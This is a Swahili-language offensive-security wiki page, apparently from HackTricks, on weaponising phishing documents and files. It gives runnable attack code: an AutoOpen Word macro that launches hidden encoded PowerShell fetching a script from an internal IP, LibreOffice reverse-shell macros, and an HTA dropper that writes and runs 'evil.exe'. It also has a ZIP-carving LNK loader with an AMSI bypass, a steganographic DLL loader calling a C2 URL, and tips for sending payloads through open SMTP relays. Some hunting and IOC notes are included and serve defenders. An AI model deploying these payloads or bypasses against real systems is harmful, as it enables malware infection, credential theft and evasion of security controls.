# Faili na Hati za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Hati za Office

Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa njia ya kutambua muundo wa data, kwa kuulinganisha na kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa kutambua muundo wa data, faili inayochanganuliwa haitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi cha faili na bado kuhifadhi uwezo wake wa kutekeleza macro.\
Kwa mfano, faili ya RTF haiungi mkono macros, kwa muundo wake, lakini faili ya DOCM iliyopewa jina jipya la RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macro.\
Misingi na mechanisms hizo hizo hutumika kwa software zote za Microsoft Office Suite (Excel, PowerPoint, n.k.).

Unaweza kutumia command ifuatayo kuangalia ni viendelezi vipi vitakavyotekelezwa na baadhi ya programs za Office:
```bash
assoc | findstr /i "word excel powerp"
```
Faili za DOCX zinazorejelea template ya remote (File –Options –Add-ins –Manage: Templates –Go) iliyo na macros zinaweza pia “kutekeleza” macros.

### External Image Load

Nenda kwenye: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Nenda kwenye: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha code yoyote kutoka kwenye document.

#### Autoload functions

Kadiri zinavyotumika zaidi, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata mwenyewe

Nenda kwenye **File > Info > Inspect Document > Inspect Document**, jambo litakaloleta Document Inspector. Bofya **Inspect**, kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Kiendelezi cha Doc

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, kisha badilisha umbizo kutoka **`.docx`** hadi Word 97-2003 **`.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro ndani ya `.docx`**, na kuna **unyanyapaa** **unaohusishwa na** kiendelezi cha **`.docm`** kinachowezesha macro (kwa mfano, ikoni ya thumbnail ina `!` kubwa, na baadhi ya web/email gateway huvizuia kabisa). Kwa hiyo, **kiendelezi hiki cha zamani cha `.doc` ndicho suluhisho bora la kati**.

#### Vijenzi vya Malicious Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro za LibreOffice ODT zinazojiendesha kiotomatiki (Basic)

Nyaraka za LibreOffice Writer zinaweza kuwa na Basic macros zilizopachikwa na kuzitekeleza kiotomatiki faili inapofunguliwa kwa kuunganisha macro kwenye tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana hivi:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Kumbuka alama za nukuu zilizorudiwa (`""`) ndani ya string – LibreOffice Basic huzitumia kufanya escape ya alama za nukuu halisi, hivyo payloads zinazoishia na `...==""")` hudumisha usawazishaji wa command ya ndani na argument ya Shell.

Vidokezo vya delivery:

- Hifadhi kama `.odt` na uhusishe macro na document event ili ianze mara moja inapofunguliwa.
- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili bytes za faili, badala ya string ya filename, zitumwe kama attachment). Hili ni muhimu unapotumia vibaya SMTP servers zinazokubali arbitrary `RCPT TO` recipients bila validation.

## Faili za HTA

HTA ni programu ya Windows inayochanganya **HTML na scripting languages (kama vile VBScript na JScript)**. Huzalisha user interface na hutekelezwa kama application ya "fully trusted", bila vikwazo vya security model ya browser.

HTA hutekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **huwekwa** pamoja na **Internet Explorer**, hivyo **`mshta` inategemea IE**. Kwa hiyo ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **invisible images** kwenye barua pepe au HTML ambayo mtumiaji ataifikia (hata HTTP MitM?). Au kumtumia mwathiriwa **address ya files** ambayo **ita-trigger** **authentication** kwa **kufungua tu folder.**

**Kagua mawazo haya na mengine katika kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kuiba hash au authentication, bali pia **kufanya NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campaigns zenye ufanisi mkubwa husambaza ZIP yenye documents mbili halali za decoy (PDF/DOCX) na .lnk yenye madhara. Mbinu ni kwamba PowerShell loader halisi imehifadhiwa ndani ya raw bytes za ZIP baada ya marker ya kipekee, na .lnk hui-carve na kuiendesha kikamilifu kwenye memory.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na PowerShell one-liner ya .lnk:

1) Tafuta ZIP ya awali katika paths za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent ya current working directory.
2) Soma bytes za ZIP na utafute marker iliyowekwa moja kwa moja (kwa mfano, xFIQCV). Kila kitu baada ya marker hiyo ni PowerShell payload iliyowekwa ndani.
3) Nakili ZIP hadi %ProgramData%, extract humo, kisha fungua decoy .docx ili ionekane halali.
4) Bypass AMSI kwa current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate stage inayofuata (kwa mfano, kuondoa herufi zote za #) na kui-execute kwenye memory.

Mfano wa PowerShell skeleton ya ku-carve na kuendesha stage iliyowekwa ndani:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery mara nyingi hutumia vibaya subdomains za PaaS zinazotegemewa (mf., *.herokuapp.com) na inaweza kuweka masharti kwa payloads (kuhudumia ZIP zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi husimbua shellcode ya base64/XOR na kuiendesha kupitia Reflection.Emit + VirtualAlloc ili kupunguza mabaki kwenye diski.

Persistence iliyotumika katika chain hiyo hiyo
- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au programu yoyote inayoi-embed ianzishe tena payload kiotomatiki.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na commands zilizo tayari kutumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Faili za ZIP zilizo na string ya ASCII ya alama (mf., xFIQCV) iliyoongezwa mwishoni mwa data ya archive.
- .lnk inayoorodhesha folders za parent/user ili kutafuta ZIP na kufungua document ya decoy.
- AMSI tampering kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Nyuzi za mawasiliano ya biashara zinazoendelea kwa muda mrefu na kumalizika kwa links zinazohifadhiwa chini ya trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Pattern nyingine inayojirudia ni **`.lnk` inayoiga document** ambayo hufungua mara moja lure isiyo na madhara huku ikiandaa chain halisi chinichini.<sup>[[3]](#references)</sup>

Observed workflow:
1. Shortcut **inajifanya kuwa PDF** na hutumia `conhost.exe` au proxy inayofanana kuanzisha PowerShell downloader iliyofichwa.
2. PowerShell hugawanya vipande vya tokens zilizo wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili detections rahisi zinazotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` zikose command hiyo.
3. Stager hupakua **document ya decoy kwanza**, huifungua kwa victim, kisha huunda upya faili hasidi chinichini.
4. Payloads zinaweza kuandikwa kwa kutumia **junk extensions** na kisha kubadilishwa majina kwa kuondoa filler characters, hivyo kuchelewesha kuonekana kwa artifacts dhahiri za `.exe` / `.cpl`.
5. Persistence huanzishwa kwa **scheduled task inayotegemea dakika** ambayo huanzisha trusted host binary kutoka kwenye path inayoweza kuandikiwa na user.

Minimal hunting clues kutoka kwenye pattern hii:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Mpangilio muhimu wa staging wa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini hatua ya pili ni stealthy

Katika case study ya Rapid7, scheduled task ilizindua **`Fondue.exe`** mara kwa mara kutoka `C:\Users\Public\`. Kwa sababu **`APPWIZ.cpl`** ilikuwa imewekwa pamoja nayo na ika-export **`RunFODW`**, binary inayoaminika ya Microsoft ili-side-load CPL ya mshambuliaji badala ya system copy halali.

CPL hiyo:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Hu-decrypt kupitia **Windows CNG / `bcrypt.dll`**
- Hutenga executable memory na kunakili shellcode iliyodecryptiwa
- Hui-execute kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa kutafutwa kando: malware mara nyingi huepuka jump ya moja kwa moja ya `((void(*)())buf)()` na badala yake hutumia vibaya **legitimate callback-taking WinAPI** kuhamisha execution.

Payload iliyodecryptiwa katika campaign hii ilikuwa **Donut** shellcode, ambayo kisha ili-map final PE kikamilifu kwenye memory na kupatch **AMSI/WLDP/ETW** katika process ya sasa kabla ya kukabidhi execution. Kwa maelezo zaidi kuhusu side-loading na memory-resident post-processing, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Practical hunting pivots:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe`, ikifuatiwa na document ya decoy inayoonekana.
- Downloads za muda mfupi kwenda **`C:\Users\Public\`**, zikifuatiwa mara moja na renaming kutoka extensions zisizo na maana.
- Scheduled tasks zenye majina yasiyoleta mashaka kama `GoogleErrorReport`, zinazotekeleza kutoka **user-writable directories**.
- Binaries zinazoaminika zinazopakia **`.cpl` / `.dll`** kutoka directory ileile isiyo ya system.
- Base64 text blobs zinazoandikwa chini ya **`C:\Windows\Tasks\`** na kisha kusomwa na module iliyoside-loadiwa.

## Payload zilizotengwa kwa Steganography kwenye picha (PowerShell stager)

Loader chains za hivi karibuni huwasilisha JavaScript/VBS iliyofichwa ambayo hu-decode na kuendesha Base64 PowerShell stager. Stager hiyo hupakua image (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama plain text kati ya start/end markers za kipekee. Script hutafuta delimiters hizi (mifano iliyoonekana in the wild: «<<sudo_png>> … <<sudo_odt>>>»), hutoa maandishi yaliyomo kati yao, hu-decode Base64 kuwa bytes, hupakia assembly kwenye memory na kuita entry method inayojulikana pamoja na C2 URL.<sup>[[5]](#references)</sup>

Mtiririko wa kazi
- Hatua ya 1: Archived JS/VBS dropper → hu-decode embedded Base64 → huzindua PowerShell stager yenye -nop -w hidden -ep bypass.
- Hatua ya 2: PowerShell stager → hupakua image, huchopoa Base64 iliyotengwa na markers, hupakia .NET DLL kwenye memory na kuita method yake (kwa mfano, VAI) ikipitisha C2 URL na options.
- Hatua ya 3: Loader hupata final payload na kwa kawaida hui-inject kupitia process hollowing kwenye binary inayoaminika (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Soma zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchopoa DLL kutoka kwenye image na kuita .NET method kwenye memory:

<details>
<summary>PowerShell stego payload extractor na loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers hutofautiana kati ya campaigns.
- AMSI/ETW bypass na string deobfuscation hutumiwa kwa kawaida kabla ya kupakia assembly.
- Hunting: scan picha zilizopakuliwa kwa delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja ku-decode Base64 blobs.

Tazama pia stego tools na carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Hatua ya mwanzo inayojirudia ni `.js` au `.vbs` ndogo, iliyofichwa kwa kiwango kikubwa, inayowasilishwa ndani ya archive. Madhumuni yake pekee ni ku-decode string ya Base64 iliyopachikwa na kuanzisha PowerShell yenye `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Soma maudhui ya faili yenyewe
- Tafuta Base64 blob kati ya junk strings
- Decode kuwa ASCII PowerShell
- Execute kwa `wscript.exe`/`cscript.exe` ikiiita `powershell.exe`

Vidokezo vya Hunting
- Attachments za JS/VBS zilizo kwenye archive zinazoanzisha `powershell.exe` yenye `-enc`/`FromBase64String` kwenye command line.
- `wscript.exe` inayoanzisha `powershell.exe -nop -w hidden` kutoka user temp paths.

## Windows files to steal NTLM hashes

Angalia ukurasa kuhusu **maeneo ya kuiba NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampeni ya ZipLine: Phishing attack ya kisasa inayolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Kufuatilia Dropping Elephant tradecraft kupitia loader chain yenye mada ya China](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Mbinu mpya ya COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader inawasilisha infostealers mbalimbali](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
